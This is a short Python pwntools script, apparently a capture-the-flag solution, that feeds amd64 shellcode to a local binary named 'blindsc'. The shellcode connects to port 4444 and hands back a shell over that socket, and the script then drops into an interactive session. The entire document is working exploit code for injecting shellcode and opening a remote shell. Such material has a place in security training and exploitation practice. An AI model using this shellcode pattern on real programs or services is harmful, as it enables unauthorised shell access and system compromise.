from pwn import *

context.arch='amd64'
r = process("./blindsc")

shellcode = shellcraft.connect('0.0.0.0', 4444)
shellcode += shellcraft.findpeersh()

r.sendafter(b': ', asm(shellcode))

r.interactive()